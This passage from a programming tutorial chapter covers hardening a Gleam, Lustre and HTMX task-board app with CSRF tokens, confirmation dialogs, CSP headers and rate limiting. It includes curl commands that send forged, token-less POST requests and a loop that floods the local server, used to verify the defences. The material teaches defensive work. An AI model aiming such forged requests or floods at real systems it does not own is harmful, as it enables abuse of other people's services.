a task, delete a board). Inspect the request headers -- you should see
`X-CSRF-Token` with a 32-character value.

### Task 2: Add `hx-confirm` to All Delete Buttons

Add confirmation dialogs to every destructive action in the app:

1. Deleting a task should show: `"Delete this task?"`
2. Deleting a board should show: `"Are you sure you want to delete this board? All tasks on this board will be permanently removed. This action cannot be undone."`
3. Removing a member from a board should show: `"Remove this member from the board? They will lose access to all tasks."`

Verify: Click a delete button. A browser confirmation dialog should appear.
Click Cancel -- nothing should happen. Click OK -- the item should be removed.

### Task 3: Set Up Content Security Policy Headers

Add a CSP header that:

1. Restricts default sources to `'self'`
2. Allows scripts from `'self'`, `https://unpkg.com`, and `'unsafe-inline'`
3. Allows styles from `'self'` and `'unsafe-inline'`
4. Restricts connections (AJAX, SSE) to `'self'`
5. Also add `X-Content-Type-Options`, `X-Frame-Options`, and `Referrer-Policy`

Verify: Open the browser's Network tab and inspect the response headers for any
page. You should see the `Content-Security-Policy` header with the correct
directives.

### Task 4: Implement Basic Rate Limiting

Implement rate limiting with a maximum of 60 requests per minute per IP:

1. Create a rate limiter actor that tracks request counts per IP address.
2. Write middleware that checks the actor before allowing a request through.
3. Return a 429 status code with a `Retry-After: 60` header when the limit
   is exceeded.

Verify: Use `curl` in a loop to send more than 60 requests in a minute:

```shell
for i in $(seq 1 65); do
  echo "Request $i: $(curl -s -o /dev/null -w '%{http_code}' http://localhost:8000/)"
done
```

The first 60 requests should return `200`. Requests 61-65 should return `429`.

### Task 5: Test CSRF Protection

Verify that CSRF protection actually works by trying to make a POST request
without a token:

```shell
# This should return 403 Forbidden
curl -X POST http://localhost:8000/tasks \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "title=Hacked+Task"

# This should also return 403 -- wrong token
curl -X POST http://localhost:8000/tasks \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "X-CSRF-Token: fake-token-12345" \
  -d "title=Hacked+Task"
```

Both requests should be rejected with a 403 status code.

---

## Exercise Solution Hints

If you get stuck, these pointers should help you get back on track.

### Hint 1: CSRF Token Per Session, Not Per Request

Generate the CSRF token once when the user first visits the site, and reuse it
for all subsequent requests in that session. Generating a new token on every
page load would break the back button and make bookmarked pages unusable.

Check for an existing token in the cookie first:

```gleam
fn ensure_csrf_token(req: Request) -> #(String, Bool) {
  case middleware.get_csrf_token(req) {
    Ok(existing_token) -> #(existing_token, False)   // Reuse existing token
    Error(Nil) -> #(middleware.generate_csrf_token(), True)  // Generate new one
  }
}
```

The `Bool` indicates whether we need to set a new cookie on the response.

### Hint 2: CSP Must Allow unpkg.com for HTMX and SSE

If your CSP is too strict, HTMX itself will not load. Make sure `script-src`
includes `https://unpkg.com`. You also need `'unsafe-inline'` for the small
CSRF configuration script.

A common mistake is forgetting `connect-src 'self'`. Without it, the browser
may block HTMX AJAX requests and SSE connections depending on the
`default-src` setting.

### Hint 3: Rate Limiter Testing with curl

For testing the rate limiter, use a simple bash loop:

```shell
for i in $(seq 1 65); do
  echo "Request $i: $(curl -s -o /dev/null -w '%{http_code}' http://localhost:8000/)"
done
```

If all requests return 200, check that:
1. The rate limiter actor is actually started in `main()`
2. The middleware is wired into the request chain
3. The `get_client_ip` function is finding an IP address (it may return
   `"unknown"` if you are testing locally without proxy headers)

### Hint 4: `hx-confirm` Is Just a String Attribute

The `hx` library provides `hx.confirm` as a typed function:

```gleam
hx.confirm("Are you sure?")
```

This produces the HTML attribute `hx-confirm="Are you sure?"` and works
identically to any other HTMX attribute.

### Hint 5: Testing CSRF Without the Token

To test that CSRF protection works, the simplest approach is `curl`. Since
`curl` does not execute JavaScript, it will not pick up the CSRF token from the
meta tag or set the header automatically. Any POST request from `curl` without
the correct `X-CSRF-Token` header should be rejected:

```shell
# Should return 403
curl -s -o /dev/null -w '%{http_code}' \
  -X POST http://localhost:8000/tasks \
  -d "title=test"
```

If you get 200 instead of 403, verify that your middleware is actually checking
the token. A common bug is forgetting to apply the `require_csrf` middleware
in the middleware chain, or applying it after the router instead of before.

---

## Key Takeaways

1. **Lustre handles XSS by default.** The `element.text()` function escapes
   HTML entities, so user input rendered through Lustre is safe. Never bypass
   this by concatenating user input into raw HTML strings.

2. **HTMX adds a new XSS vector via `hx-*` attributes.** Use `hx-disable` on
   containers holding user-generated content to prevent HTMX from processing
   injected attributes. Combine this with `connect-src 'self'` in your CSP to
   block requests to external servers.

3. **CSRF protection follows a meta tag pattern.** Store the token in a
   `<meta>` tag, configure HTMX to send it as an `X-CSRF-Token` header via the
   `htmx:configRequest` event, and validate it on the server against a signed
   cookie. This works for all HTMX requests, not just form submissions.

4. **`hx-confirm` guards against accidental clicks.** Use short messages for
   low-impact actions (`"Delete this task?"`) and detailed messages for
   high-impact actions (`"Are you sure you want to delete this board? All
   tasks will be permanently removed."`).

5. **Security headers are cheap insurance.** CSP, `X-Content-Type-Options`,
   `X-Frame-Options`, and `Referrer-Policy` each take one line to add and
   defend against entire categories of attacks.

6. **Rate limiting with an actor is natural in Gleam.** The OTP actor model
   gives you a thread-safe, in-memory rate limiter with no external
   dependencies. For production use behind multiple server instances, consider
   a shared store like Redis.

7. **Defense in depth is the strategy.** No single measure is perfect. Lustre
   escapes HTML. `hx-disable` blocks attribute processing. CSP restricts
   resource loading. CSRF tokens prevent forged requests. Rate limiting
   prevents abuse. Each layer catches what the others miss.

8. **Security is middleware, not an afterthought.** By building security checks
   as composable middleware functions, they apply consistently to every request.
   A new route automatically gets CSRF protection, rate limiting, and security
   headers without the developer having to remember anything.

---

**Next chapter:** With our application secured, [Chapter 15](15-testing.md) will focus on
**testing** -- writing unit tests for validation logic, integration tests for
routes, and testing HTMX interactions using `wisp/simulate`.
